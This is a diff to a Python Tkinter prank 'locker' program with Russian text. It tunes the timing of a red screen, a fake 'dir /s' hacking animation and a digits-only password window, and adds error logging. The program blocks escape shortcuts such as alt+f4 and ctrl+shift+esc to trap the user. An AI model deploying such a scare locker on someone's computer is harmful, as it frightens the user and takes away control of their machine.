@@ -18,6 +18,7 @@ BLOCKED = ["left windows", "right windows", "alt+tab", "alt+f4",
            "ctrl+esc", "alt+esc", "ctrl+shift+esc"]
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+ERROR_LOG = os.path.join(SCRIPT_DIR, "error.log")
 
 SOUND_B64 = os.path.join(SCRIPT_DIR, "sound.b64")
 VOICE_B64 = os.path.join(SCRIPT_DIR, "voice.b64")
@@ -27,7 +28,6 @@ VOICE_WAV = os.path.join(SCRIPT_DIR, "voice.wav")
 _TEMP_SOUND = os.path.join(tempfile.gettempdir(), "cyberhack_sound.wav")
 _TEMP_VOICE = os.path.join(tempfile.gettempdir(), "cyberhack_voice.wav")
 
-# Строки, которые «стекают» вместо матрицы (визуальный эффект).
 DIR_S_TEXT = [
     r"C:\>dir /s",
     r"C:\Users\user>dir /s /b *.docx",
@@ -110,10 +110,8 @@ def play_voice():
     if not path:
         return
     try:
-        winsound.PlaySound(
-            path,
-            winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP
-        )
+        # без SND_LOOP — чтобы не зависало на больших WAV
+        winsound.PlaySound(path, winsound.SND_FILENAME | winsound.SND_ASYNC)
     except Exception:
         pass
 
@@ -241,22 +239,20 @@ class Locker:
         self.blank = tk.Frame(self.root, bg="black")
         self.blank.pack(fill=tk.BOTH, expand=True)
 
-        # 1.0 с — красный экран (2 секунды) + sound1.b64
+        # 1.0 с — красный экран (2 сек) + sound
         self.root.after(1000, self._show_red)
-        # 3.0 с — dir /s + voice.b64
-        self.root.after(3000, self._start_dirs)
-        # 6.0 с — окно с паролем
+        # 6.0 с — окно с паролем (страховка, если _start_dirs не сработал)
         self.root.after(6000, self._show_password_ui)
 
-    # --------- красный экран (2 сек) ---------
     def _show_red(self):
         for w in self.root.winfo_children():
             w.destroy()
         self.red = tk.Frame(self.root, bg="#7a0000")
         self.red.pack(fill=tk.BOTH, expand=True)
-        play_sound()  # sound1.b64
+        play_sound()
+        # через 2 сек — dir /s
+        self.root.after(2000, self._start_dirs)
 
-    # --------- dir /s + voice ---------
     def _start_dirs(self):
         if self._dirs_started:
             return
@@ -265,7 +261,7 @@ class Locker:
         for w in self.root.winfo_children():
             w.destroy()
 
-        play_voice()  # voice.b64 (зациклено)
+        play_voice()
 
         self.canvas = tk.Canvas(self.root, bg="black",
                                 highlightthickness=0, bd=0)
@@ -338,7 +334,6 @@ class Locker:
 
         self.root.after(70, self._animate_dirs)
 
-    # --------- окно с паролем ---------
     def _show_password_ui(self):
         for w in self.root.winfo_children():
             w.destroy()
@@ -392,7 +387,7 @@ class Locker:
         if not pwd.isdigit():
             sound_wrong()
             self.text.configure(state="normal")
-            self.text.insert(tk.END, "\nТолько цифры, [censored].\n")
+            self.text.insert(tk.END, "\nТолько цифры.\n")
             self.text.see(tk.END)
             self.text.configure(state="disabled")
             return
@@ -454,6 +449,14 @@ if __name__ == "__main__":
         unblock_keys()
         stop_all_sounds()
         sys.exit(0)
+    except Exception:
+        import traceback
+        try:
+            with open(ERROR_LOG, "w", encoding="utf-8") as f:
+                f.write(traceback.format_exc())
+        except Exception:
+            pass
+        raise
     finally:
         unblock_keys()
         stop_all_sounds()
